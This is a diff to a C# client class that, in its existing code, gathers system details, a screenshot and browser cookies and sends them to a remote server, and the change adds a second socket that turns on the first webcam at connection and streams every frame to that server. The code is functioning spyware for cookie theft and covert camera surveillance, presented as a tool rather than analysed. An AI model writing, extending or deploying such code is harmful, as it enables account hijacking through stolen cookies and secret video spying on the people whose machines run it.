@@ -1,14 +1,17 @@
 ﻿using System;
+using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Management;
+using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
-using System.Drawing;
-using System.Drawing.Imaging;
 using System.Windows.Forms;
-using System.Net;
-using Microsoft.Data.Sqlite; // Import de Microsoft.Data.Sqlite pour utiliser SQLiteConnection
+using AForge.Video;
+using AForge.Video.DirectShow;
+using Microsoft.Data.Sqlite;
+
 
 
 namespace Test_Socket
@@ -16,16 +19,20 @@ namespace Test_Socket
     public class ClientCollecte
     {
         private string IPserver;
-        private int Portserver;
+        private int portText;
+        private int portVideo;
 
         private StreamWriter writer;
         private StreamReader reader;
-        private Socket s;
+        private Socket textSocket;
+        private Socket videoSocket;
+        private VideoCaptureDevice videoSource;
 
-        public ClientCollecte(string IPserver, int Portserver)
+        public ClientCollecte(string IPserver, int portText, int portVideo)
         {
             this.IPserver = IPserver;
-            this.Portserver = Portserver;
+            this.portText = portText;
+            this.portVideo = portVideo;
             ConnectToServer();
         }
 
@@ -33,15 +40,22 @@ namespace Test_Socket
         {
             try
             {
-                s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(IPserver), Portserver);
-                s.Connect(endPoint);
+                textSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(IPserver), portText);
+                textSocket.Connect(endPoint);
 
-                NetworkStream stream = new NetworkStream(s);
+                videoSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                IPEndPoint videoEndPoint = new IPEndPoint(IPAddress.Parse(IPserver), portVideo);
+                videoSocket.Connect(videoEndPoint);
+
+                NetworkStream stream = new NetworkStream(textSocket);
                 writer = new StreamWriter(stream); // Ne pas utiliser using ici
                 reader = new StreamReader(stream);
 
                 MessageBox.Show("Client Connected...");
+
+                // Démarrer la capture vidéo une fois la connexion établie
+                StartVideoCapture();
             }
             catch (Exception ex)
             {
@@ -248,6 +262,55 @@ namespace Test_Socket
             byte[] screenshotBytes = TakeScreenshot();
             string cookies = CollectCookies();
             SendData(os, mother, proc, ram, disk, screenshotBytes, cookies);
+        }
+
+        private void StartVideoCapture()
+        {
+            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+            if (videoDevices.Count > 0)
+            {
+                videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
+                videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
+                videoSource.Start();
+            }
+            else
+            {
+                MessageBox.Show("Aucune caméra détectée.");
+            }
+        }
+
+        private void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
+        {
+            Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();
+            byte[] imageBytes = ImageToByteArray(bitmap);
+            SendVideoData(imageBytes);
+        }
+
+        private byte[] ImageToByteArray(Bitmap bitmap)
+        {
+            using (MemoryStream stream = new MemoryStream())
+            {
+                bitmap.Save(stream, ImageFormat.Jpeg);
+                return stream.ToArray();
+            }
+        }
+
+        private void SendVideoData(byte[] videoData)
+        {
+            try
+            {
+                if (videoSocket == null || !videoSocket.Connected)
+                {
+                    MessageBox.Show("La connexion au serveur n'est pas établie.");
+                    return;
+                }
+
+                videoSocket.Send(videoData);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Erreur lors de l'envoi de la vidéo : " + ex.Message);
+            }
         }
     }
 }
